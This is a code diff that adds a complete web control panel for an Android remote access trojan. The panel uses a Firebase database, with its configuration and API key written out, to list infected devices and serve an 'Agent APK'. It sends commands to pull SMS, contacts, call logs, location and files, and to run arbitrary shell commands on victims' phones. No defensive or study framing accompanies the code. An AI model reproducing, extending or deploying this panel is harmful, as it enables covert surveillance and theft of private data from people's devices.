@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>RAT Panel</title>
+<script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-database-compat.js"></script>
+<style>
+  * { box-sizing:border-box; }
+  body { margin:0; font:14px "Segoe UI",system-ui,sans-serif; background:#0d0d0d; color:#bfbfbf; }
+  header { padding:14px 20px; background:#161616; border-bottom:1px solid #2a2a2a; display:flex; justify-content:space-between; align-items:center; }
+  header h1 { margin:0; font-size:18px; color:#7fff7f; }
+  main { max-width:1100px; margin:0 auto; padding:16px; }
+  h2 { color:#7fff7f; font-size:15px; margin:20px 0 8px; }
+  .row { border:1px solid #222; background:#141414; padding:10px; margin-bottom:10px; border-radius:6px; }
+  .row .dev { font-weight:600; color:#4caf50; }
+  .row .meta { color:#888; font-size:12px; margin:2px 0 8px; }
+  button { background:#1e1e1e; color:#7fff7f; border:1px solid #2c2c2c; padding:5px 12px; margin:2px 4px 2px 0; border-radius:4px; cursor:pointer; font-size:13px; }
+  button:hover { background:#26381f; }
+  button.flat { color:#ccc; }
+  input[type=text] { background:#1a1a1a; border:1px solid #333; color:#8f8; padding:6px 8px; border-radius:4px; width:280px; margin-right:4px; }
+  select { background:#1a1a1a; color:#8f8; border:1px solid #333; padding:6px; border-radius:4px; }
+  pre { background:#000; color:#7fff7f; padding:10px; max-height:360px; overflow:auto; border:1px solid #222; border-radius:4px; font-size:12px; white-space:pre-wrap; }
+  .badge { display:inline-block; padding:2px 8px; border-radius:3px; font-size:11px; }
+  .on  { background:#123f12; color:#7fff7f; }
+  .off { background:#3f1212; color:#ff7f7f; }
+  #preview { display:none; margin-top:10px; }
+  table { width:100%; border-collapse:collapse; font-size:12px; }
+  table th, table td { border-bottom:1px solid #222; padding:4px 6px; text-align:left; }
+  table th { color:#4caf50; }
+  .dl { background:#123f3f; color:#7fffff; }
+</style>
+</head>
+<body>
+<header>
+  <h1>&#9679; RAT Control Panel</h1>
+  <div>
+    <a id="apkBtn" class="dl" href="/apk" style="text-decoration:none;color:#7fffff">&#8595; Agent APK</a>
+  </div>
+</header>
+<script>
+// turn APK button into a direct download link the moment one lands in apk/
+function refreshApkBtn() {
+  fetch('/apk').then(r=>r.json()).then(j=>{
+    if (j.apks && j.apks.length) {
+      document.getElementById('apkBtn').href = '/apk/' + j.apks[0];
+      document.getElementById('apkBtn').textContent = '\u2193 ' + j.apks[0];
+    }
+  }).catch(()=>{});
+}
+refreshApkBtn();
+setInterval(refreshApkBtn, 5000);
+</script>
+<main>
+
+<h2>Agents</h2>
+<div id="agents"><i>scanning…</i></div>
+
+<h2>Memory (REST snapshot)</h2>
+<div id="memory"><i>idle</i></div>
+
+<h2>Output</h2>
+<pre id="output">waiting…</pre>
+
+</main>
+<script>
+const firebaseConfig = {
+  apiKey: "AIzaSyBnm5Crd7MANpMGxtf85ENKlE-CC0gKEIE",
+  authDomain: "ratioapp-66d16.firebaseapp.com",
+  databaseURL: "https://ratioapp-66d16-default-rtdb.firebaseio.com",
+  projectId: "ratioapp-66d16",
+  storageBucket: "ratioapp-66d16.firebasestorage.app",
+  messagingSenderId: "147343532360",
+  appId: "1:147343532360:web:1e210bdaf3e944992a137d"
+};
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
+const URL_HELPER = location.origin + '/panel.html';
+
+function fmtTs(t) {
+  if (!t) return '—';
+  const d = new Date(t);
+  const diff = Date.now() - t;
+  return d.toLocaleTimeString() + ' (' + (diff < 20000 ? 'online' : Math.floor(diff/60000)+'m ago') + ')';
+}
+
+function setPending() {
+  document.getElementById('output').textContent = '>> ' + currentAction + ' dispatched, waiting…';
+}
+
+document.getElementById('output').textContent = 'panel booted, agents loading…';
+
+// ---- agent list, full live read
+db.ref('agents').on('value', snap => {
+  const agents = snap.val() || {};
+  const el = document.getElementById('agents');
+  el.innerHTML = '';
+
+  const ids = Object.keys(agents);
+  if (!ids.length) {
+    el.innerHTML = '<i>no agents connected — install APK on device and wait ~10s</i>';
+    return;
+  }
+
+  for (const [id, a] of Object.entries(agents)) {
+    const prof = a.profile || {};
+    const lastSeen = prof.lastSeen || 0;
+    const online = (Date.now() - lastSeen) < 25000;
+    const Row = document.createElement('div');
+    Row.className = 'row';
+    Row.innerHTML =
+      '<span class="dev">'+id+'</span> ' +
+      '<span class="badge '+(online?'on':'off')+'">'+(online?'ONLINE':'OFFLINE')+'</span><br/>' +
+      '<div class="meta">'+(prof.manufacturer||'?')+' '+(prof.model||'?')+' — Android '+(prof.version||'?')+' (SDK '+(prof.sdk||'?')+') — seen '+fmtTs(lastSeen)+'</div>' +
+      '<button data-c="device_info">Info</button>' +
+      '<button data-c="location">Location</button>' +
+      '<button data-c="sms">SMS</button>' +
+      '<button data-c="contacts">Contacts</button>' +
+      '<button data-c="call_log">Call Log</button>' +
+      '<button data-c="list_files" data-arg="/sdcard">List /sdcard</button>' +
+      '<input type="text" id="path_'+id+'" placeholder="/sdcard/Download/file.jpg"/>' +
+      '<button data-c="list_files" class="flat" data-arg="#path">Path</button>' +
+      '<button data-c="download_file" data-arg="#path">Download</button><br/>' +
+      '<input type="text" id="sh_'+id+'" placeholder="$ pm list packages"/>' +
+      '<button data-c="shell" class="flat" data-arg="#sh">exec</button>';
+    Row.querySelectorAll('button').forEach(btn => {
+      btn.onclick = () => {
+        let arg = btn.dataset.arg;
+        if (arg === '#path') arg = document.getElementById('path_'+id).value;
+        if (arg === '#sh')   arg = document.getElementById('sh_'+id).value;
+        sendCommand(id, btn.dataset.c, arg || '');
+      };
+    });
+    el.appendChild(Row);
+  }
+}, err => {
+  document.getElementById('agents').innerHTML =
+    '<i style="color:#f87">RTDB read failed: '+err.message+' — check database rules + internet</i>';
+});
+
+// ---- push a command into the live agent
+let currentAction = '';
+function sendCommand(device, action, arg) {
+  currentAction = action;
+  const ref = db.ref('agents/'+device+'/commands').push();
+  ref.set({ action: action, arg: arg });
+  document.getElementById('output').textContent =
+    '>> ['+device+'] '+action+' '+(arg||'') + ' — dispatched, waiting…';
+}
+
+// ---- stream results live
+db.ref('results').limitToLast(1).on('child_added', snap => {
+  const [dev, payload] = Object.entries(snap.val())[0] || [null, null];
+  if (!payload) return;
+  document.getElementById('output').textContent =
+    'RESULTS — device: ' + snap.key + '\n' + JSON.stringify(payload, null, 2);
+  previewPayload(payload);
+}, err => {
+  document.getElementById('output').textContent =
+    'results listener error: ' + err.message + ' — rules issue';
+});
+
+// ---- rebuild data delivered table from agent /data nodes
+function previewPayload(payload) {
+  const pv = document.getElementById('preview');
+  const mem = document.getElementById('memory');
+  // results carries whatever was asked; if it's bulk data, table it
+  if (payload.data && Array.isArray(payload.data)) {
+    mem.innerHTML = renderTable(payload.data);
+  } else if (payload.data && typeof payload.data === 'object') {
+    mem.innerHTML = '<pre>' + JSON.stringify(payload.data, null, 2) + '</pre>';
+  }
+}
+
+function renderTable(rows) {
+  if (!rows.length) return '<i>empty</i>';
+  const cols = Object.keys(rows[0]);
+  return '<table><thead><tr>' + cols.map(c=>'<th>'+c+'</th>').join('') + '</tr></thead><tbody>' +
+    rows.map(r => '<tr>'+cols.map(c=>'<td>'+String(r[c]==null?'':r[c]).slice(0,120)+'</td>').join('')+'</tr>').join('') +
+    '</tbody></table>';
+}
+</script>
+</body>
+</html>
